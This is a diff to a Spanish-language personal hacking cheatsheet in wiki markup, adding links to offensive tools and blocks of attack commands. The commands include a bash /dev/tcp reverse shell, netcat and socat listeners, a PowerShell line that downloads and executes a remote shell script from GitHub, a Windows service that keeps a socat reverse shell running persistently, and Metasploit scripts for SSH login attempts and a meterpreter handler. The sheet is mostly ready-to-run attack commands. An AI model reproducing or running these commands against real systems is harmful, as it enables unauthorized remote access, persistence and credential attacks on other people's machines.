@@ -8,6 +8,9 @@
 - [[netcat]]
 - [[https://github.com/FDX100/GOD-KILLERhttps://github.com/FDX100/GOD-KILLER|GOD-KILLER(SMS)]]
 - [[https://computingforgeeks.com/install-metasploit-framework-on-debian/|instalación metasploit]]
+- [[https://gtfobins.github.io/gtfobins/bash|todas las posibles reverse shell linux]]
+- [[https://github.com/bitbrute/evillimiter|limitar internet]]
+- [[https://overthewire.org/wargames/|retos para aprender hacking]]
 = Cheatsheet =
 === Reverse shell meterpreter ===
 {{{bash
@@ -18,6 +21,19 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=4444 -f exe
 socat file:`tty`,raw,echo=0 TCP-L:4444
 socat exec:bash,pty,stderr,setsid,sigint,sane tcp:192.168.0.16:4444
 }}}
+=== Reverse shell con bash ===
+- Servidor
+{{{bash
+socat file:`tty`,raw,echo=0 TCP-L:4444
+# o
+nc -lvp 4444
+}}}
+- Cliente
+{{{bash
+export RHOST=192.196.0.16
+export RPORT=4444
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+}}}
 === Reverse shell windows guapificado ===
 - Servidor
 {{{bash
@@ -27,4 +43,28 @@ stty raw -echo; (stty size; cat) | nc -lvnp 4444
 {{{batch
 powershell -c IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.16 4444
 }}}
-
+=== Crear servicio powershell ===
+{{{bash
+New-Service -Name "netcatr" -BinaryPathName '"C:\\nc\socat.exe 192.168.0.200 4444"' -Description "reverse shell" -StartupType Automatic
+}}}
+=== script meterpreter ===
+- msfconsole -r nombre_script.rc copiar contenido del bloque en el archivo
+{{{bash
+# Conectarse a traves de ssh con meterpreter
+use auxiliary/scanner/ssh/ssh_login
+set rhosts <ip> 
+set username <usuario>   
+set password <contraseña>
+exploit
+# Now convert command shell into meterpreter shell through following command
+# session -u 1
+}}}
+{{{bash
+# Poner a la escucha el metasploit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.16
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+}}}
